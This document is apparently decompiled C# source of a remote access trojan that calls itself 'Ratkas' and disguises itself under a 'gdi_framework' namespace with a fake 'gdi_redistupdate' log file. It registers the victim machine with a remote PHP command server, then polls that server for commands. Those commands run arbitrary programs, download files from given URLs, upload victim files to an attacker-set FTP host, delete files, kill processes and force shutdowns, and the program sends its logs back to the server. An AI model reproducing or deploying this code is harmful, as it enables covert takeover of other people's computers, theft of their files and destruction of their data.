namespace gdi_framework
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.VisualBasic.Devices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    using System.Text;
    using System.Threading;

    public class Payload
    {
        [CompilerGenerated, AccessedThroughProperty("WC")]
        private WebClient _WC;
        private IniFile Configuration;
        private int CurrentMessageCount;
        private FileIORealtime FileIOSys;
        private string FTP_HOST;
        private string FTP_PASSWORD;
        private string FTP_USERNAME;
        private string Password;
        private PHPC PHPC_Client;
        private string UDID;
        private string Username;

        public Payload(string Server, IniFile Configuration, string Username = "Anonymous", string Password = "Anonymous")
        {
            this.WC = new WebClient();
            this.WriteToDebugLog("Attempting to connect to the server ...");
            while (true)
            {
                try
                {
                    this.PHPC_Client = new PHPC(new Uri(Server), true, Username, Password);
                    this.WriteToDebugLog("Connected!");
                    break;
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    Exception exception = exception1;
                    this.WriteToDebugLog($"Connection Error: {exception.Message}");
                    ProjectData.ClearProjectError();
                }
                this.WriteToDebugLog("Retrying in 10 seconds...");
                Thread.Sleep(0x2710);
            }
            this.Configuration = Configuration;
            this.Username = Username;
            this.Password = Password;
        }

        public void Connect()
        {
            try
            {
                ComputerInfo info = new ComputerInfo();
                this.WriteToDebugLog(" -- Start Debug Info -- ");
                this.WriteToDebugLog($" Machine: {Environment.MachineName}");
                this.WriteToDebugLog($" Version: {Environment.OSVersion.VersionString}");
                this.WriteToDebugLog($" OS Name: {info.OSFullName}");
                this.WriteToDebugLog($" Username: {Environment.UserName}");
                this.WriteToDebugLog($" Working Directory: {Environment.CurrentDirectory}");
                this.WriteToDebugLog($" Is Rooted: {new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)}");
                this.WriteToDebugLog(" -- End Debug Info -- ");
                if (this.Configuration.GetKeyValue("connection", "udid") == "None")
                {
                    this.WriteToDebugLog("UDID Required, Requesting UDID From server...");
                    PHPC.Vodka data = new PHPC.Vodka();
                    data = this.Hook(data);
                    data.Add("request", "getudid");
                    data.Add("machine", Environment.MachineName);
                    data.Add("version", info.OSVersion);
                    data.Add("username", Environment.UserName);
                    data.Add("osname", info.OSFullName);
                    string str = this.PHPC_Client.SendRequest(data);
                    if (str.ToLower().Contains("request;success"))
                    {
                        string str2 = str.ToLower().Replace("request;success ", "");
                        this.WriteToDebugLog($"UDID Created! {str2}");
                        this.Configuration.SetKeyValue("connection", "udid", str2);
                        this.Configuration.Save($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}/SQLiConfig.dat");
                        this.WriteToDebugLog("A connection is made to the server!");
                        this.UDID = str2;
                    }
                    else
                    {
                        this.WriteToDebugLog("Fatal Error: Unknown response from the server, Restart payload after 5 seconds...");
                        Thread.Sleep(0x1388);
                        this.Connect();
                    }
                }
                else
                {
                    this.WriteToDebugLog("Checking if UDID exists on the server...");
                    PHPC.Vodka vodka2 = new PHPC.Vodka();
                    vodka2 = this.Hook(vodka2);
                    vodka2.Add("request", "verify");
                    vodka2.Add("udid", this.Configuration.GetKeyValue("connection", "udid"));
                    string str3 = this.PHPC_Client.SendRequest(vodka2);
                    if (str3.ToLower().Contains("request;success"))
                    {
                        this.WriteToDebugLog("UDID OK");
                        this.WriteToDebugLog("A connection is made to the server!");
                        this.UDID = this.Configuration.GetKeyValue("connection", "udid");
                    }
                    else if (str3.ToLower().Contains("request;failure"))
                    {
                        this.WriteToDebugLog("UDID Doesn't exist on remote server, Creating one now.");
                        vodka2.Clear();
                        vodka2 = this.Hook(vodka2);
                        vodka2.Add("request", "getudid");
                        vodka2.Add("machine", Environment.MachineName);
                        vodka2.Add("version", info.OSVersion);
                        vodka2.Add("username", Environment.UserName);
                        vodka2.Add("osname", info.OSFullName);
                        str3 = this.PHPC_Client.SendRequest(vodka2);
                        if (str3.ToLower().Contains("request;success"))
                        {
                            string str4 = str3.ToLower().Replace("request;success ", "");
                            this.WriteToDebugLog($"UDID Created! {str4}");
                            this.Configuration.SetKeyValue("connection", "udid", str4);
                            this.Configuration.Save($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}/SQLiConfig.dat");
                            this.WriteToDebugLog("A connection is made to the server!");
                            this.UDID = str4;
                        }
                    }
                    else
                    {
                        this.WriteToDebugLog("Fatal Error: Unknown response from the server, Restart payload after 5 seconds...");
                        Thread.Sleep(0x1b58);
                        MainModule.Main();
                    }
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                Interaction.MsgBox($"There was an critical error while trying to initialize the network driver{Environment.NewLine}{Environment.NewLine}Error:{exception.Message}", MsgBoxStyle.ApplicationModal, null);
                ProjectData.ClearProjectError();
            }
        }

        public string FetchCommand(int Command)
        {
            PHPC.Vodka data = new PHPC.Vodka();
            data = this.Hook(data);
            data.Add("udid", this.UDID);
            data.Add("request", "get_command");
            data.Add("commandid", Command.ToString());
            return this.PHPC_Client.SendRequest(data);
        }

        public PHPC.Vodka Hook(PHPC.Vodka Data)
        {
            Data.Add("command", "hook");
            Data.Add("program", "Ratkas");
            return Data;
        }

        public void ListenForCommands()
        {
            this.WriteToLog("Driver Started");
            this.FileIOSys = new FileIORealtime();
            this.WriteToDebugLog("Listening to commands...");
            while (true)
            {
                try
                {
                    string str = this.SendCommand("fetch_update");
                    if (str == "Null")
                    {
                        this.WriteToDebugLog(" > No updates");
                    }
                    else
                    {
                        this.WriteToLog("Update found, Fetching commands...");
                        this.WriteToDebugLog($" > Update found, ID: {str}");
                        this.ProcessCommands(this.FetchCommand(1), this.FetchCommand(2), this.FetchCommand(3));
                    }
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    Exception exception = exception1;
                    this.WriteToDebugLog($" 0x00000a recoverable error> {exception.Message}");
                    ProjectData.ClearProjectError();
                }
                GC.Collect();
                Thread.Sleep(0x1388);
            }
        }

        public void ProcessCommands(string Command1, string Command2, string Command3)
        {
            if (Command1 == "Null")
            {
                Command1 = "";
            }
            if (Command2 == "Null")
            {
                Command2 = "";
            }
            if (Command3 == "Null")
            {
                Command3 = "";
            }
            try
            {
                string s = Command1.ToLower();
                switch (<PrivateImplementationDetails>.ComputeStringHash(s))
                {
                    case 0x3108b3f9:
                        if (s == "download")
                        {
                            goto Label_04EF;
                        }
                        goto Label_087A;

                    case 0x3c5c055c:
                        if (s == "upload")
                        {
                            goto Label_05D9;
                        }
                        goto Label_087A;

                    case 0x47297986:
                        if (s == "cp")
                        {
                            goto Label_039D;
                        }
                        goto Label_087A;

                    case 0x5b299902:
                        if (s == "cd")
                        {
                            goto Label_02BF;
                        }
                        goto Label_087A;

                    case 0x605481e8:
                        if (s == "rm")
                        {
                            goto Label_0359;
                        }
                        goto Label_087A;

                    case 0x5631dfe8:
                        if (s == "ls")
                        {
                            goto Label_02F1;
                        }
                        goto Label_087A;

                    case 0x592e130a:
                        if (s == "mv")
                        {
                            goto Label_03CB;
                        }
                        goto Label_087A;

                    case 0x635486a1:
                        if (s == "rn")
                        {
                            goto Label_03F9;
                        }
                        goto Label_087A;

                    case 0x652b04df:
                        if (s == "start")
                        {
                            break;
                        }
                        goto Label_087A;

                    case 0xabe3e5d8:
                        if (s == "mkdir")
                        {
                            goto Label_037B;
                        }
                        goto Label_087A;

                    case 0xe103566e:
                        if (s == "machine")
                        {
                            goto Label_0427;
                        }
                        goto Label_087A;

                    case 0xec3e2fe1:
                        if (s == "proc")
                        {
                            goto Label_064F;
                        }
                        goto Label_087A;

                    case 0xb8ddd025:
                        if (s == "ftp")
                        {
                            goto Label_0539;
                        }
                        goto Label_087A;

                    case 0xbaa8b444:
                        if (s == "whoami")
                        {
                            goto Label_0840;
                        }
                        goto Label_087A;

                    default:
                        goto Label_087A;
                }
                if (Command3 == "")
                {
                    this.WriteToLog($"Executing '{Command2}' w/o Arguments ...");
                    Process.Start(Command2);
                    this.WriteToLog("Executed Successfully");
                }
                else
                {
                    this.WriteToLog($"Executing '{Command2}' w/ Arguments '{Command3}' ...");
                    Process.Start(Command2, Command3);
                    this.WriteToLog("Executed Successfully");
                }
                return;
            Label_02BF:
                this.FileIOSys.ChangeDirectory(this.FileIOSys.DecodeWildcards(Command2));
                this.WriteToLog($"Current working directory is {Environment.CurrentDirectory}");
                return;
            Label_02F1:
                if (Command2.ToLower() == "files")
                {
                    this.WriteToLog(this.FileIOSys.ListFiles());
                }
                else if (Command2.ToLower() == "dirs")
                {
                    this.WriteToLog(this.FileIOSys.ListDirectories());
                }
                else
                {
                    this.WriteToLog(this.FileIOSys.List());
                }
                return;
            Label_0359:
                this.WriteToLog(this.FileIOSys.Delete(this.FileIOSys.DecodeWildcards(Command2)));
                return;
            Label_037B:
                this.WriteToLog(this.FileIOSys.MakeDirectory(this.FileIOSys.DecodeWildcards(Command2)));
                return;
            Label_039D:
                this.WriteToLog(this.FileIOSys.Copy(this.FileIOSys.DecodeWildcards(Command2), this.FileIOSys.DecodeWildcards(Command3)));
                return;
            Label_03CB:
                this.WriteToLog(this.FileIOSys.Move(this.FileIOSys.DecodeWildcards(Command2), this.FileIOSys.DecodeWildcards(Command3)));
                return;
            Label_03F9:
                this.WriteToLog(this.FileIOSys.Rename(this.FileIOSys.DecodeWildcards(Command2), this.FileIOSys.DecodeWildcards(Command3)));
                return;
            Label_0427:;
                try
                {
                    if (Command2.ToLower() == "shutdown")
                    {
                        Process.Start("shutdown", "-s -t 00");
                        this.WriteToLog("Shutdown command sent!");
                    }
                    else if (Command2.ToLower() == "reboot")
                    {
                        Process.Start("shutdown", "-r -t 00");
                        this.WriteToLog("Reboot command sent!");
                    }
                    else if (Command2.ToLower() == "logout")
                    {
                        Process.Start("shutdown", "-l -t 00");
                        this.WriteToLog("Logout command sent!");
                    }
                    else
                    {
                        this.WriteToLog("Error sending power command: Unknown Shutdown command, use SHUTDOWN/REBOOT/LOGOUT");
                    }
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    Exception exception = exception1;
                    this.WriteToLog("Error sending power command: " + exception.Message);
                    ProjectData.ClearProjectError();
                }
                return;
            Label_04EF:;
                try
                {
                    this.WriteToLog("Starting download...");
                    this.WC.DownloadFileAsync(new Uri(Command2), Command3);
                }
                catch (Exception exception9)
                {
                    ProjectData.SetProjectError(exception9);
                    Exception exception2 = exception9;
                    this.WriteToLog("WC Download Plugin Error: " + exception2.Message);
                    ProjectData.ClearProjectError();
                }
                return;
            Label_0539:
                if (Command2.ToLower() == "host")
                {
                    this.FTP_HOST = Command3;
                    this.WriteToLog($"FTP Host set to {Command3}");
                }
                else if (Command2.ToLower() == "username")
                {
                    this.FTP_USERNAME = Command3;
                    this.WriteToLog($"FTP Username set to {Command3}");
                }
                else if (Command2.ToLower() == "password")
                {
                    this.FTP_PASSWORD = Command3;
                    this.WriteToLog($"FTP Password set to {Command3}");
                }
                else
                {
                    this.WriteToLog("Unknown FTP Property!");
                }
                return;
            Label_05D9:
                this.WriteToLog($"Uploading {this.FileIOSys.DecodeWildcards(Command2)} as {$"ftp://{this.FTP_HOST}{Command3}"} to remote server");
                new Network().UploadFile(this.FileIOSys.DecodeWildcards(Command2), $"ftp://{this.FTP_HOST}{Command3}", this.FTP_USERNAME, this.FTP_PASSWORD, false, 0x1388);
                this.WriteToLog("File uploaded!");
                return;
            Label_064F:
                if (Command2.ToLower() == "list")
                {
                    try
                    {
                        this.WriteToLog("Listing process list...");
                        string newLine = Environment.NewLine;
                        foreach (Process process in Process.GetProcesses())
                        {
                            string[] textArray1 = new string[] { newLine, process.ProcessName, " | ", Conversions.ToString(process.Id), Environment.NewLine };
                            newLine = string.Concat(textArray1);
                        }
                        this.WriteToLog(newLine);
                        newLine = null;
                    }
                    catch (Exception exception10)
                    {
                        ProjectData.SetProjectError(exception10);
                        Exception exception3 = exception10;
                        this.WriteToLog("TSKMGR Error: " + exception3.Message);
                        ProjectData.ClearProjectError();
                    }
                }
                else if (Command2.ToLower() == "kill")
                {
                    this.WriteToLog("Killing process...");
                    foreach (Process process2 in Process.GetProcessesByName(Command3))
                    {
                        try
                        {
                            process2.Kill();
                            process2.WaitForExit();
                            this.WriteToLog("Killed.");
                        }
                        catch (Win32Exception exception11)
                        {
                            ProjectData.SetProjectError(exception11);
                            Win32Exception exception4 = exception11;
                            ProjectData.ClearProjectError();
                        }
                        catch (InvalidOperationException exception12)
                        {
                            ProjectData.SetProjectError(exception12);
                            InvalidOperationException exception5 = exception12;
                            this.WriteToLog("Invalid Exception: " + exception5.Message);
                            ProjectData.ClearProjectError();
                        }
                    }
                }
                else if (Command2.ToLower() == "alive")
                {
                    foreach (Process process3 in Process.GetProcessesByName(Command3))
                    {
                        try
                        {
                            this.WriteToLog("Process exists! (" + Conversions.ToString(process3.Id) + ")");
                        }
                        catch (Win32Exception exception13)
                        {
                            ProjectData.SetProjectError(exception13);
                            Win32Exception exception6 = exception13;
                            ProjectData.ClearProjectError();
                        }
                        catch (InvalidOperationException exception14)
                        {
                            ProjectData.SetProjectError(exception14);
                            InvalidOperationException exception7 = exception14;
                            this.WriteToLog("Invalid Exception: " + exception7.Message);
                            ProjectData.ClearProjectError();
                        }
                    }
                }
                else
                {
                    this.WriteToLog("Invalid proc command (Win32 Exception)");
                }
                return;
            Label_0840:
                if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                {
                    this.WriteToLog("You are logged in as ROOT");
                }
                else
                {
                    this.WriteToLog($"You are logged in as {Environment.UserName}");
                }
                return;
            Label_087A:
                this.WriteToLog("Unknown command!");
            }
            catch (Exception exception15)
            {
                ProjectData.SetProjectError(exception15);
                Exception exception8 = exception15;
                this.WriteToLog($"Processing Error: {exception8.Message}");
                ProjectData.ClearProjectError();
            }
        }

        public string SendCommand(string Command)
        {
            PHPC.Vodka data = new PHPC.Vodka();
            data = this.Hook(data);
            data.Add("udid", this.UDID);
            data.Add("request", Command);
            return this.PHPC_Client.SendRequest(data);
        }

        private void WC_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            this.WriteToLog("Download Complete");
        }

        private void WC_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            if (this.CurrentMessageCount == 5)
            {
                this.CurrentMessageCount = 0;
                this.WriteToLog("Downloaded " + Conversions.ToString(e.BytesReceived) + "|" + Conversions.ToString(e.TotalBytesToReceive) + " [" + Conversions.ToString(e.ProgressPercentage) + "%]");
            }
            else
            {
                this.CurrentMessageCount++;
            }
        }

        private void WriteToDebugLog(string Message)
        {
            try
            {
                if (!System.IO.File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}/gdi_redistupdate.log"))
                {
                    using (StreamWriter writer = System.IO.File.CreateText($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}/gdi_redistupdate.log"))
                    {
                        writer.WriteLine(Message);
                    }
                }
                using (StreamWriter writer2 = System.IO.File.AppendText($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}/gdi_redistupdate.log"))
                {
                    writer2.WriteLine(Message);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
        }

        public void WriteToLog(string Message)
        {
            try
            {
                try
                {
                    this.WriteToDebugLog($" [LOG] {Message}");
                    PHPC.Vodka data = new PHPC.Vodka();
                    data = this.Hook(data);
                    data.Add("udid", this.UDID);
                    data.Add("request", "log");
                    data.Add("message", Convert.ToBase64String(Encoding.UTF8.GetBytes(Message)));
                    this.PHPC_Client.SendRequest(data);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    Exception exception = exception1;
                    this.WriteToLog($"Error writing to log: {exception.Message}");
                    ProjectData.ClearProjectError();
                }
            }
            catch (Exception exception3)
            {
                ProjectData.SetProjectError(exception3);
                Exception exception2 = exception3;
                this.WriteToDebugLog($"Error writing to log: {exception2.Message}");
                ProjectData.ClearProjectError();
            }
        }

        private WebClient WC
        {
            [CompilerGenerated]
            get => 
                this._WC;
            [MethodImpl(MethodImplOptions.Synchronized), CompilerGenerated]
            set
            {
                AsyncCompletedEventHandler handler = new AsyncCompletedEventHandler(this.WC_DownloadFileCompleted);
                DownloadProgressChangedEventHandler handler2 = new DownloadProgressChangedEventHandler(this.WC_DownloadProgressChanged);
                WebClient client = this._WC;
                if (client != null)
                {
                    client.DownloadFileCompleted -= handler;
                    client.DownloadProgressChanged -= handler2;
                }
                this._WC = value;
                client = this._WC;
                if (client != null)
                {
                    client.DownloadFileCompleted += handler;
                    client.DownloadProgressChanged += handler2;
                }
            }
        }
    }
}

